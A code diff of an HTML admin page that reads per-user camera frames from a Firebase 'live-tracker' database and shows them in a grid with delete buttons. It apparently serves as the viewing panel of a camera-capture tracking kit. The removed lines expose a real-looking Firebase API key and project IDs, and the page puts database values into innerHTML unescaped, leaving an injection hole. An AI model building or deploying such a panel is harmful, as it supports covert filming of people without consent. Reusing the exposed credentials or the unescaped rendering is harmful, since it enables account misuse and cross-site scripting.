@@ -7,171 +7,146 @@
 
 <style>
 body{
-  margin:0;
-  font-family:Arial;
-  background:#0b1220;
-  color:white;
+    margin:0;
+    font-family:Arial,sans-serif;
+    background:#0b1220;
+    color:#fff;
 }
 
-/* HEADER */
 header{
-  padding:15px;
-  text-align:center;
-  background:#0f172a;
-  color:#00ff9d;
-  font-weight:bold;
-  letter-spacing:2px;
-  border-bottom:1px solid #00ff9d33;
+    padding:15px;
+    text-align:center;
+    background:#0f172a;
+    color:#00ff9d;
+    font-size:22px;
+    font-weight:bold;
+    border-bottom:1px solid #00ff9d44;
 }
 
-/* MAIN CONTAINER */
 .container{
-  display:flex;
-  flex-direction:column;
-  gap:15px;
-  padding:15px;
+    display:grid;
+    grid-template-columns:repeat(auto-fill,minmax(320px,1fr));
+    gap:15px;
+    padding:15px;
 }
 
-/* USER BOX */
 .userBox{
-  background:#1e293b;
-  padding:15px;
-  border-radius:12px;
-  box-shadow:0 0 10px rgba(0,255,157,0.1);
+    background:#1e293b;
+    border-radius:12px;
+    padding:15px;
+    box-shadow:0 0 10px rgba(0,255,157,.15);
 }
 
-/* IMAGE WRAPPER (IMPORTANT FOR FULL IMAGE) */
+.userBox h3{
+    margin:0 0 10px;
+    color:#00ff9d;
+}
+
 .imgBox{
-  width:100%;
-  max-height:400px;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  margin-top:10px;
-  background:#0f172a;
-  border-radius:10px;
-  overflow:hidden;
+    width:100%;
+    height:320px;
+    background:#0f172a;
+    border-radius:10px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
 }
 
-/* IMAGE FIX */
 .imgBox img{
-  width:100%;
-  height:auto;          /* 🔥 full image show */
-  max-height:400px;
-  object-fit:contain;   /* 🔥 NO CUT, NO STRETCH */
-  border-radius:10px;
+    width:100%;
+    height:100%;
+    object-fit:contain;
 }
 
-/* BUTTON */
 button{
-  margin-top:10px;
-  padding:8px 12px;
-  border:none;
-  border-radius:8px;
-  cursor:pointer;
-  background:#ef4444;
-  color:white;
-  font-weight:bold;
+    margin-top:10px;
+    width:100%;
+    padding:10px;
+    border:none;
+    border-radius:8px;
+    background:#ef4444;
+    color:white;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#dc2626;
 }
 </style>
 </head>
 
 <body>
 
-<header>📡 READY TO TRACK</header>
+<header>📡 MULTI USER ADMIN PANEL</header>
 
-<div class="container" id="grid"></div>
+<div id="grid" class="container"></div>
 
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
 <script>
 const firebaseConfig = {
-  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57OALtSkfNdMmrE",
-  authDomain: "live-tracker-554a7.firebaseapp.com",
-  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
-  projectId: "live-tracker-554a7",
-  storageBucket: "live-tracker-554a7.firebasestorage.app",
-  messagingSenderId: "951695061306",
-  appId: "1:951695061306:web:a7b9478538f86f50a36003"
+    apiKey: "YOUR_API_KEY",
+    authDomain: "YOUR_PROJECT.firebaseapp.com",
+    databaseURL: "YOUR_DATABASE_URL",
+    projectId: "YOUR_PROJECT_ID",
+    storageBucket: "YOUR_BUCKET",
+    messagingSenderId: "XXXX",
+    appId: "XXXX"
 };
 
 firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
 
+const db = firebase.database();
 const grid = document.getElementById("grid");
 
-/* LOAD USERS */
-db.ref("camera").on("value",(snap)=>{
+db.ref("camera").on("value", (snapshot) => {
 
-  const data = snap.val();
-  grid.innerHTML="";
+    const users = snapshot.val();
 
-  if(!data){
-    grid.innerHTML="<p>No Users Found</p>";
-    return;
-  }
+    grid.innerHTML = "";
 
-  Object.keys(data).forEach(userId=>{
+    if (!users) {
+        grid.innerHTML = "<h2>No Users Found</h2>";
+        return;
+    }
 
-    const box = document.createElement("div");
-    box.className = "userBox";
+    Object.entries(users).forEach(([userId, userData]) => {
 
-    box.innerHTML = `
-      <h3>👤 ${userId}</h3>
+        const frame =
+            userData?.frame ||
+            "https://via.placeholder.com/600x400?text=No+Image";
 
-      <div class="imgBox">
-        <img id="img_${userId}" src="" />
-      </div>
+        const card = document.createElement("div");
+        card.className = "userBox";
 
-      <button onclick="deleteUser('${userId}')">
-        DELETE USER
-      </button>
-    `;
+        card.innerHTML = `
+            <h3>👤 ${userId}</h3>
 
-    grid.appendChild(box);
+            <div class="imgBox">
+                <img src="${frame}">
+            </div>
 
-    loadImage(userId);
+            <button onclick="deleteUser('${userId}')">
+                DELETE USER
+            </button>
+        `;
 
-  });
+        grid.appendChild(card);
+    });
 
 });
 
-/* LOAD LATEST IMAGE */
-function loadImage(userId){
-
-  const ref = db.ref("camera/" + userId);
-
-  ref.on("value",(snap)=>{
-
-    const data = snap.val();
-    const img = document.getElementById("img_" + userId);
-
-    if(!data){
-      img.src = "https://via.placeholder.com/600x400?text=No+Image";
-      return;
-    }
-
-    // latest image
-    const lastItem = data.frame;
-
-    img.src = lastItem || "https://via.placeholder.com/600x400?text=No+Image";
-
-  });
-
-}
-
-/* DELETE USER */
 function deleteUser(userId){
 
-  if(confirm("Delete this user?")){
+    if(!confirm("Delete " + userId + " ?")) return;
 
-    db.ref("camera/" + userId).remove()
-    .then(()=>alert("Deleted"))
-    .catch(err=>alert(err.message));
-
-  }
-
+    db.ref("camera/" + userId)
+      .remove()
+      .then(() => alert("Deleted"))
+      .catch(err => alert(err.message));
 }
 </script>
 
